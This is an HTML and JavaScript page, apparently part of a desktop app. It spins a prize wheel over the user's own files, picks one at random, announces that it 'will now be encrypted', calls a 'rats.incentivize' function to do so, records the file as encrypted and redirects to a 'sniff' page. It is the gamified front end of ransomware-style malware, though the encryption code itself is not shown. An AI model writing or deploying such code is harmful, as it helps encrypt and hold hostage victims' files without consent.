<!doctype html>
<html>

<head>
  <meta charset="UTF-8" />
  <title>Drumroll please... ğŸ¥ğŸ¥ğŸ¥</title>

  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css"
    integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">

  <style>
    html,
    body {
      height: 100%;
      background-color: #222;
      color: #fff;
      font-family:
        -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial,
        sans-serif;
        overflow: hidden;
    }

    .center {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);

      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .marker {
      position: absolute;
      z-index: 1;

      width: 3rem;
      height: 3rem;

      clip-path: polygon(0 0, 100% 0, 50% 100%);

      background-color: #2196f3;
    }

    .wheel {
      background-color: #f5f5f5;
      border: solid .5rem #212121;

      width: 60rem;
      height: 60rem;
      padding: 0;

      border-radius: 50%;

      overflow: hidden;
      position: relative;

      transition: transform 8s cubic-bezier(0, 0.5, 0.5, 1);
    }

    .wheel>li {
      position: absolute;
      list-style: none;

      color: #212121;
      font-weight: 600;
      font-size: 2rem;

      clip-path: polygon(0 0, 100% 50%, 0 100%);

      top: calc(50% - 8.25rem);
      width: 50%;
      height: 16.5rem;

      transform-origin: 100% 50%;

      padding-left: 1.5rem;
      box-sizing: border-box;

      display: flex;
      align-items: center;
    }

    .wheel>li:nth-child(2n) {
      background-color: #e53935;
    }

    .wheel>li:nth-child(2n+1) {
      background-color: #f5f5f5;
    }

    /* Merci Ben */
    .wheel>li:nth-child(1) {
      transform: rotate(0deg);
    }

    .wheel>li:nth-child(2) {
      transform: rotate(30deg);
    }

    .wheel>li:nth-child(3) {
      transform: rotate(60deg);
    }

    .wheel>li:nth-child(4) {
      transform: rotate(90deg);
    }

    .wheel>li:nth-child(5) {
      transform: rotate(120deg);
    }

    .wheel>li:nth-child(6) {
      transform: rotate(150deg);
    }

    .wheel>li:nth-child(7) {
      transform: rotate(180deg);
    }

    .wheel>li:nth-child(8) {
      transform: rotate(210deg);
    }

    .wheel>li:nth-child(9) {
      transform: rotate(240deg);
    }

    .wheel>li:nth-child(10) {
      transform: rotate(270deg);
    }

    .wheel>li:nth-child(11) {
      transform: rotate(300deg);
    }

    .wheel>li:nth-child(12) {
      transform: rotate(330deg);
    }
  </style>
</head>

<body>
  <div class="center">
    <div class="marker"></div>
    <ul class="wheel" id="wheel">
    </ul>
  </div>

  <script src="https://confettijs.org/confetti.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/toastify-js"></script>
  <script type="module">
    const wheel = document.getElementById('wheel');

    (async () => {
      const files = await window.rats.listIncentives(12);
      for (let i = 0; i < files.length; i++) {
        const el = document.createElement('li');
        el.innerText = files[i].name;
        wheel.appendChild(el);
      }

      const resultId = Math.floor(Math.random() * 12);
      const resultFile = files[resultId];

      wheel.style.transition = 'none';
      wheel.style.transform = 'rotate(0deg)';

      setTimeout(() => {
        const newAngle = 1800 - 270 - resultId * 30 + (Math.random() - 0.5) * 30;
        wheel.style.transition = 'transform 8s cubic-bezier(0, 0.5, 0.5, 1)';
        wheel.style.transform = `rotate(${newAngle}deg)`;
      }, 10);

      setTimeout(() => {
        const confetti = new Confetti('wheel');
        confetti.setCount(100);
        confetti.setSize(1.5);
        confetti.setPower(25);
        confetti.destroyTarget(false);

        setTimeout(() => {
          const wheelRect = wheel.getBoundingClientRect();
          wheel.dispatchEvent(new MouseEvent('click', { clientX: wheelRect.x + wheelRect.width / 2, clientY: wheelRect.y + wheelRect.height / 2 }));
          confetti.setCount(0);

          Toastify({
            text: `Congratulations! ${resultFile.name} will now be encrypted.`,
            duration: 5000,
            newWindow: true,
            close: false,
            gravity: 'bottom',
            position: 'center',
            stopOnFocus: true
          }).showToast();

          window.rats.incentivize(resultFile);

          const lastEncryptedFiles = localStorage.getItem('encryptedFiles') != null ? JSON.parse(localStorage.getItem('encryptedFiles')) : [];
          lastEncryptedFiles.push(resultFile.name);
          localStorage.setItem('encryptedFiles', JSON.stringify(lastEncryptedFiles));

          setTimeout(() => { window.location.href = 'sniff.html' }, 5000);
        }, 10);
      }, 8000);
    })();
  </script>
</body>